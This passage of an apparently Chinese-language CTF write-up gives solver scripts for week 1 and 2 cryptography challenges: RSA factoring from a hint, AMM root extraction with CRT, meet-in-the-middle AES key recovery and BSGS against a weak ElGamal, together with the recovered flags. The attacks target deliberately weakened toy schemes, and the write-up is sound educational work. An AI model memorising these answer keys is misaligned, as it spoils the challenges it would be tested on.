function_">result</span>(<span class="params">a_list, m_list</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m_list)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(m_list)):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> != math.gcd(m_list[i], m_list[j]):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;不能直接利用中国剩余定理&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> mi <span class="keyword">in</span> m_list:</span><br><span class="line">        m *= mi</span><br><span class="line">    Mi_list = Get_Mi(m_list, m)</span><br><span class="line">    Mi_inverse = Get_resMi(Mi_list, m_list)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a_list)):</span><br><span class="line">        x += Mi_list[i] * Mi_inverse[i] * a_list[i]</span><br><span class="line">        x %= m</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_dec</span>(<span class="params">n,e,c</span>):</span><br><span class="line">    phi=n-<span class="number">1</span></span><br><span class="line">    gcd1 = gmpy2.gcd(e, phi)</span><br><span class="line">    t1 = e // gcd1</span><br><span class="line">    dt = gmpy2.invert(t1, phi)</span><br><span class="line">    m_gcd1 = gmpy2.powmod(c, dt, n)</span><br><span class="line">    m = gmpy2.iroot(m_gcd1, gcd1)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">n = <span class="number">131597024257614620869648421307952022599943625170798058722475560465555374754170467986433278540604131619940641178519954230167502146438244308999511105433219427638803460889093328223802388178143540560813587991639442439109510325931982801296494725966519902673302205827914999084293810023067168509012158443748031939483</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1968659140793648429069472000786965200510587960406184785982668854732724642287423003255222009970017202179772168410459767605874195614574533370563277818681668876342943583147204497260995173839443989636764614809399895977498001560095317260220383552929292480197409615426208803132661827666690467265686165715909909838</span></span><br><span class="line">hint = <span class="number">8041845809205494984282719083536906169105876887210623661715566866580197885950852556859414098121226785749033039450259965513505083753685569890927709072642971188655408152663342066047346862975209503093968807589977151718256296935551857116746970823854584764670720138775077146982697233376686489502015164620786724</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    p_add_q = gmpy2.iroot(hint + k*n,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> p_add_q[<span class="number">1</span>]:</span><br><span class="line">        s_square = k * n + hint</span><br><span class="line">        s = p_add_q[<span class="number">0</span>]</span><br><span class="line">        inner_value = s_square - <span class="number">4</span> * n</span><br><span class="line">        <span class="comment"># print(&#x27;s_square:&#x27;,s_square)</span></span><br><span class="line">        <span class="comment"># print(&#x27;inner_value:&#x27;,inner_value)</span></span><br><span class="line">        </span><br><span class="line">        inner_value_sqrt = gmpy2.iroot(inner_value,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">assert</span> inner_value_sqrt**<span class="number">2</span> == inner_value</span><br><span class="line">        p = (s - inner_value_sqrt) // <span class="number">2</span></span><br><span class="line">        q = (s + inner_value_sqrt) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>,q)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - dicreat_log(a, d)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c ^ r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"> </span><br><span class="line">n = <span class="number">131597024257614620869648421307952022599943625170798058722475560465555374754170467986433278540604131619940641178519954230167502146438244308999511105433219427638803460889093328223802388178143540560813587991639442439109510325931982801296494725966519902673302205827914999084293810023067168509012158443748031939483</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1968659140793648429069472000786965200510587960406184785982668854732724642287423003255222009970017202179772168410459767605874195614574533370563277818681668876342943583147204497260995173839443989636764614809399895977498001560095317260220383552929292480197409615426208803132661827666690467265686165715909909838</span></span><br><span class="line">p = <span class="number">11426824077836755495280357054790333684863938044257704528662235024002507215836880134548286374738252595545758498922210216905258406873430274217501038930995351</span></span><br><span class="line">q = <span class="number">11516500417019426723367143367023721121114237031914370279724222540748204265234478123246834079895657926608151549574717796604640363281423933511518846958827933</span></span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">mq = AMM(cq, e, q)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">q_proot = findAllPRoot(q, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line"><span class="comment"># print(mps, mqs)</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start CRT...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(mpp), <span class="built_in">int</span>(mqq)], [p, q])</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(solution))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;1t_i5_N0T_4_c0mmOn_R5A!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>能通，但时间很久，挂了一晚上出了，耗时<code>34657s</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251014121956534.png" alt="image-20251014121956534"></p>
<h2 id="Week2-findKey-in-middle"><a href="#Week2-findKey-in-middle" class="headerlink" title="[Week2] findKey in middle"></a>[Week2] findKey in middle</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(<span class="number">3</span>, x, p) * <span class="built_in">pow</span>(<span class="number">5</span>, y, p)) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_key</span>(<span class="params">key</span>):</span><br><span class="line">    x, y = getPrime(<span class="number">16</span>), getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> x * y &gt; key</span><br><span class="line">    k1, k2 = key % x, key % y</span><br><span class="line">    <span class="keyword">return</span> k1, k2, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">key, flag</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(pad(flag, <span class="number">16</span>))   </span><br><span class="line"></span><br><span class="line">p = <span class="number">1000000007</span></span><br><span class="line"></span><br><span class="line">key = getrandbits(<span class="number">32</span>)</span><br><span class="line">k1, k2, mod1, mod2 = split_key(key)</span><br><span class="line">x = f(k1, k2)</span><br><span class="line"></span><br><span class="line">cipher = aes_encrypt(sha256(long_to_bytes(key)).digest()[:<span class="number">16</span>], flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x = <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;mod = <span class="subst">&#123;(mod1, mod2)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;cipher = <span class="subst">&#123;cipher&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># x = 367608838</span></span><br><span class="line"><span class="comment"># mod = (41813, 53149)</span></span><br><span class="line"><span class="comment"># cipher = b&#x27;\x98\xfd\xa8\x05R\x17\xb6y%&quot;\t\xb4\xd7\x82\xc4\&#x27;\x0b8\x14q\xff.\x13\xfb\xa4D\xb4\xde-\xd5c\xd6M\x13\x90\xdb\x81\xbd\xd0c&gt;A\xbc)\xd0U\x7fW&#x27;</span></span><br></pre></td></tr></table></figure>

<p>因为 <code>k1 &lt; 41813</code> 且 <code>k2 &lt; 53149</code>，搜索空间很小。虽然直接暴力所有 <code>(k1, k2)</code> 会稍大，但可以分两步优化：</p>
<p> 计算 <code>3^k1 mod p</code> 并存入表。<br> 对每个 <code>k2</code> 计算 <code>(367608838 * 5^&#123;-k2&#125;) mod p</code>，查表得到匹配的 <code>k1</code>。</p>
<p>有了 <code>(k1, k2)</code> 后，用中国剩余定理 (CRT) 合并</p>
<p>即可得到唯一解 <code>key</code></p>
<p>AI梭的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = <span class="number">1000000007</span></span><br><span class="line">x_target = <span class="number">367608838</span></span><br><span class="line">mod1, mod2 = <span class="number">41813</span>, <span class="number">53149</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的密文（来自题目）</span></span><br><span class="line">cipher = <span class="string">b&#x27;\x98\xfd\xa8\x05R\x17\xb6y%&quot;\t\xb4\xd7\x82\xc4\&#x27;\x0b8\x14q\xff.\x13\xfb\xa4D\xb4\xde-\xd5c\xd6M\x13\x90\xdb\x81\xbd\xd0c&gt;A\xbc)\xd0U\x7fW&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 预计算 3^k1 mod p 的哈希表</span></span><br><span class="line">pow3 = &#123;&#125;</span><br><span class="line">v = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k1 <span class="keyword">in</span> <span class="built_in">range</span>(mod1):</span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> pow3:</span><br><span class="line">        pow3[v] = k1</span><br><span class="line">    v = (v * <span class="number">3</span>) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 计算 inv5 并枚举 k2，查表寻找匹配</span></span><br><span class="line">inv5 = <span class="built_in">pow</span>(<span class="number">5</span>, p-<span class="number">2</span>, p)</span><br><span class="line">cur = x_target</span><br><span class="line">found = []</span><br><span class="line"><span class="keyword">for</span> k2 <span class="keyword">in</span> <span class="built_in">range</span>(mod2):</span><br><span class="line">    <span class="keyword">if</span> cur <span class="keyword">in</span> pow3:</span><br><span class="line">        k1 = pow3[cur]</span><br><span class="line">        found.append((k1, k2))</span><br><span class="line">    cur = (cur * inv5) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;找到的 (k1, k2) 列表：&quot;</span>, found)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) CRT 合并</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (a, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    g, x1, y1 = egcd(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> (g, y1, x1 - (a // b) * y1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crt_pair</span>(<span class="params">a1, m1, a2, m2</span>):</span><br><span class="line">    g, s, t = egcd(m1, m2)</span><br><span class="line">    <span class="keyword">if</span> (a2 - a1) % g != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    lcm = m1 // g * m2</span><br><span class="line">    mult = ((a2 - a1) // g) * s % (m2 // g)</span><br><span class="line">    x = (a1 + m1 * mult) % lcm</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line"><span class="keyword">for</span> k1, k2 <span class="keyword">in</span> found:</span><br><span class="line">    key_candidate = crt_pair(k1, mod1, k2, mod2)</span><br><span class="line">    results.append((k1, k2, key_candidate))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k1, k2, key <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nk1=<span class="subst">&#123;k1&#125;</span>, k2=<span class="subst">&#123;k2&#125;</span>, 合并得到 key=<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;CRT 失败。&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> key &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;注意：得到的 key 超过 32-bit 范围（&gt;= 2**32）。&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    aes_key = sha256(long_to_bytes(key)).digest()[:<span class="number">16</span>]</span><br><span class="line">    aes = AES.new(aes_key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext = unpad(aes.decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解密成功！flag =&quot;</span>, plaintext)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解密/去填充失败：&quot;</span>, e)</span><br><span class="line"><span class="comment"># 解密成功！flag = b&#x27;flag&#123;e31343dd-4795-4236-bbec-11b8410b5ce6&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week2-baby-Elgamal"><a href="#Week2-baby-Elgamal" class="headerlink" title="[Week2] baby Elgamal"></a>[Week2] baby Elgamal</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = random.randint(<span class="number">2</span>, p - <span class="number">2</span>)</span><br><span class="line">x = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;g = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;y = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = random.randint(<span class="number">2</span>, p - <span class="number">2</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">c2 = m ^ <span class="built_in">pow</span>(y, k, p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 10560464175631160709999383504944939280267067560378620626979040921315467798501630079655340663547895515812021911470304483075907600549587171358369476255124337</span></span><br><span class="line"><span class="string">g = 5572911063894340974483734192541353411838868965361107134612465011908061780180242348779533324820127053271574799429894984956163372524626786431177292215721384</span></span><br><span class="line"><span class="string">y = 2551976503972625362405323290468587787679347326045114894085518452627208422960190509410833573983206966744456211220857302778318665690771595372276106771043208</span></span><br><span class="line"><span class="string">c1 = 1205617983130100879228661072981675725569095797251301660744333997969095366993470887762473783053252549837619991656838026541987751368433948599410216526314464</span></span><br><span class="line"><span class="string">c2 = 135410793997875487972298785237681131478761447205213610635842285010164308038301697054176371628605014267489864238137735560888444688177201474949707954751577</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>BSGS求离散对数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 把题目中给出的数粘贴到这里 ---</span></span><br><span class="line">p = <span class="number">10560464175631160709999383504944939280267067560378620626979040921315467798501630079655340663547895515812021911470304483075907600549587171358369476255124337</span></span><br><span class="line">g = <span class="number">5572911063894340974483734192541353411838868965361107134612465011908061780180242348779533324820127053271574799429894984956163372524626786431177292215721384</span></span><br><span class="line">y = <span class="number">2551976503972625362405323290468587787679347326045114894085518452627208422960190509410833573983206966744456211220857302778318665690771595372276106771043208</span></span><br><span class="line">c1 = <span class="number">1205617983130100879228661072981675725569095797251301660744333997969095366993470887762473783053252549837619991656838026541987751368433948599410216526314464</span></span><br><span class="line">c2 = <span class="number">135410793997875487972298785237681131478761447205213610635842285010164308038301697054176371628605014267489864238137735560888444688177201474949707954751577</span></span><br><span class="line"><span class="comment"># ------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上界（由代码中的 getrandbits(32) 可知）</span></span><br><span class="line">X_BOUND = <span class="number">1</span> &lt;&lt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baby_step_giant_step</span>(<span class="params">g, y, p, bound</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    求解 g^x = y (mod p)，x 在 [0, bound)，使用 BSGS。</span></span><br><span class="line"><span class="string">    返回找到的 x 或 None。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    m = isqrt(bound) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># baby steps: g^j -&gt; j</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    cur = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> cur <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">            table[cur] = j</span><br><span class="line">        cur = (cur * g) % p</span><br><span class="line"></span><br><span class="line">    <span class="comment"># factor = g^&#123;-m&#125; mod p</span></span><br><span class="line">    factor = <span class="built_in">pow</span>(g, p-<span class="number">1</span>-m, p)  <span class="comment"># 使用费马小定理计算逆元: g^&#123;-m&#125; = g^&#123;p-1-m&#125; (mod p)</span></span><br><span class="line"></span><br><span class="line">    gamma = y</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> gamma <span class="keyword">in</span> table:</span><br><span class="line">            j = table[gamma]</span><br><span class="line">            x = i * m + j</span><br><span class="line">            <span class="keyword">if</span> x &lt; bound <span class="keyword">and</span> <span class="built_in">pow</span>(g, x, p) == y:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line">        gamma = (gamma * factor) % p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    x = baby_step_giant_step(g, y, p, X_BOUND)</span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到 x（超出设定范围或出错）。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找到 x =&quot;</span>, x)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算共享密钥 s = c1^x mod p = y^k mod p</span></span><br><span class="line">    s = <span class="built_in">pow</span>(c1, x, p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 恢复明文整数 m</span></span><br><span class="line">    m_int = c2 ^ s</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转回 bytes</span></span><br><span class="line">    flag = long_to_bytes(m_int)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># flag&#123;31g4m41_D15cr373_10g&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week2-Furious-BlackCopper"><a href="#Week2-Furious-BlackCopper" class="headerlink" title="[Week2] Furious BlackCopper"></a>[Week2] Furious BlackCopper</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p,q,r = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">n = p*q*r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint1 = <span class="subst">&#123;p % (<span class="number">1</span>&lt;&lt;<span class="number">20</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint2 = <span class="subst">&#123;(p&gt;&gt;<span class="number">30</span>) % (<span class="number">2</span>**<span class="number">800</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 